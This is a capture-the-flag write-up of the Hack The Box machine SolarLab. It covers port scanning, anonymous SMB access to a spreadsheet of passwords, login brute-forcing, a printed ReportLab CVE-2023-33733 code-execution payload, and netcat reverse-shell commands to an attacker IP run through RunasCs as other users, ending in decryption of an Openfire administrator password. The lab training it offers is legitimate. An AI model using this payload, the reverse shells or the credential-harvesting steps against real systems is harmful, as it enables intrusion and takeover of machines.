---
title: HTB-Solarlab
draft: false
tags:
  - htb
  - windows
  - medium
  - reportlab
  - runascs
  - openfire
---
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/SolarLab.png)

## Information Gathering
### Rustscan

Rustscan finds HTTP, SMB, and port 6791 running. 

```bash
┌──(yoon㉿kali)-[~/Documents/htb/solarlab]
└─$ rustscan --addresses 10.10.11.16 --range 1-65535
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢
<snip>
Host is up, received syn-ack (0.35s latency).
Scanned at 2024-05-20 22:47:30 EDT for 3s

PORT     STATE SERVICE      REASON
80/tcp   open  http         syn-ack
135/tcp  open  msrpc        syn-ack
139/tcp  open  netbios-ssn  syn-ack
445/tcp  open  microsoft-ds syn-ack
6791/tcp open  hnm          syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.75 seconds
```

## Enumeration
### HTTP - TCP 80
After adding **solarlab.htb** to `/etc/hosts`, we can access the website:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-1.png)

Scrolling down a bit, we see employee names on the website:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-7.png)

### report.solarlab.htb - TCP 6791

When we try to access port 6791 through the web browser, it directs us to **report.solarlab.htb**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-2.png)

After adding **report.solarlab.htb** to `/etc/hosts`, we can access it.

The website shows a login portal:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-3.png)

### SMB - TCP 445
Luckily, we are able to list shares with no login credentials:

`smbclient -N -L \\10.10.11.16`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image.png)

`/Documents` is accessible with no credentials:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-4.png)

Let's recursively download all the content inside of it:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-5.png)


**details-file.xlsx** reveals bunch of information including usernames and passwords:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-6.png)

Let's organize information found:


| Username                     | Password              | Email                           |
|------------------------------|-----------------------|---------------------------------|
| Alexander.knight@gmail.com   | al;ksdhfewoiuh        | Alexander.knight@gmail.com      |
| KAlexander                   | dkjafblkjadsfgl       | Alexander.knight@gmail.com      |
| Alexander.knight@gmail.com   | d398sadsknr390        | Claudia.springer@gmail.com      |
| blake.byte                   | ThisCanB3typedeasily1@| blake@purdue.edu                |
| AlexanderK                   | danenacia9234n        | Alexander.knight@gmail.com      |
| ClaudiaS                     | dadsfawe9dafkn        | Claudia.springer@gmail.com      |



### Login Portal Bruteforce

Using the discovered list of usernames and passwords, we can attempt bruteforce attack on report.solarlab.htb.

It seems that Burp Suite bruteforce results either show length of **2403** or **2414**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-8.png)

**2403** indicates that the user was not found:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-9.png)

**2414** indicates that the user was found but password was wrong:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-10.png)

Since **2403** means the user is not found, let's filter search only for **2414** and see what users are found to be valid:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-11.png)

It seems that we have valid list of users:

- AlexanderK
- laudiaS

This username is following the convention of **Firstname**.**initial_of_lastname**.

Let's try bruteforcing again by with user **Blake Byte** added to the list with the username of **BlakeB**.

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-12.png)

We get a valid match -> **BlakeB:ThisCanB3typedeasily1@**

Using the credentials, we can login as BlakeB and we are directed to `/dashboard`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-36.png)

### ReportHub Enumeration

At **report.solarlab.htb**, there are four paths:

- /homeOfficeRequest
- /travelApprovalForm
- /leaveRequest
- /trainingRequest

Each of them shows a different but similar form as such:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-13.png)

After filling in the form, clicking on **Generate PDF** will create a PDF file as such:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-15.png)

Let's download the PDF and see what platform the website is using to generate PDF:

`exiftool output.pdf`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-16.png)

**report.solarlab.htb** is using **ReportLab** for geerating PDFs.

## ReportLab RCE

Goolging for ReportLab vulnerability, it seems that there's an [RCE vulnerability](https://security.snyk.io/vuln/SNYK-PYTHON-REPORTLAB-5664897) for it:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-17.png)

[CVE-2023-33733](https://github.com/c53elyas/CVE-2023-33733/tree/master) will allow us to exploit RCE.

We can use the following payload to execute commands on the target:

```
<para>
              <font color="[ [ getattr(pow,Word('__globals__'))['os'].system('commands_to_execute') for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and 'red'">
                exploit
                </font>
            </para>""", content)
build_document(doc, content)
```

In order to spawn a reverse shell, let's use [revshells.com](https://www.revshells.com/) and generate powershell reverse shell payload encoded with Base64:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-22.png)

Now, let's intercept any of the **Generate PDF** request through Burp Suite.

We will modifying the part where we indicate **training_request**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-20.png)

Now let's copy paste the payload from revshell.com as such:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-21.png)

Forwarding the request, we get reverse shell connection on our netcat listener as Blake:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-18.png)

## Privesc: blake to openfire

`net users` command shows a user **openfire**.

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-23.png)

This is interesting. We might need to escalate into openfire user before Administrator.

Looking around **blake**'s home directory, there's a interesting file named **users.db**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-24.png)

**users.db** reveals bunch of potential credentials:

| Username    | Password                 |
|-------------|---------------------------|
| alexanderk  | HotP!fireguard           |
| claudias    | 007poiuytrewq            |
| blakeb      | ThisCanB3typedeasily1@   |

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-25.png)




### RunasCs.exe

[RunasCs.exe](https://github.com/antonioCoco/RunasCs/releases) helps different users to run commands as the specified user.

Let's upload **RunasCs.exe** to the target using the command `impacket-smbserver share -smb2support $(pwd)` and `copy \\10.10.14.13\share\RunasCs.exe .`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-27.png)

One of passwords found from **users.db** was being reused for user **openfire** and we can execute commands as user openfire using RunaCs.exe:

`.\RunasCs.exe openfire HotP!fireguard "whoami"`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-29.png)


Now, in order to spawn reverse shell as **openfire**, let's upload **nc.exe**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-28.png)

Running `.\RunasCs.exe openfire HotP!fireguard "C:\tmp\nc.exe 10.10.14.13 1234 -e powershell"`, we get a reverse shell as openfire on our netcat listener:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-30.png)

## Privesc: openfire to administrator

In `C:\Progra Files\Openfire`, there's a directory named **embedded-db**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-31.png)

Inside **embedded-db**, there's **openfire.script**, and it contains encrypted password along with the decryption key.

Below is the part where it contains the encrypted password:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-32.png)

Below shows the part with decryption key:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-33.png)



### Openfire Password Decrypt
Using [Openfire_decrypt](https://github.com/c0rdis/openfire_decrypt), we can easily decrypt the password using the password key:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/s1.png)


Password is cracked to be **ThisPasswordShouldDo!@**.

Again, using **RunasCs.exe**, we can run commands as the administrator:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-34.png)

Similarly, reverse shell can be spawned as the administrator:

`./RunasCs.exe administrator ThisPasswordShouldDo!@ "C:\tmp\nc.exe 10.10.14.13 1339 -e powershell"`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-35.png)

## References
- https://github.com/antonioCoco/RunasCs/releases
- https://github.com/c0rdis/openfire_decrypt
- https://github.com/c53elyas/CVE-2023-33733/tree/master
- https://security.snyk.io/vuln/SNYK-PYTHON-REPORTLAB-5664897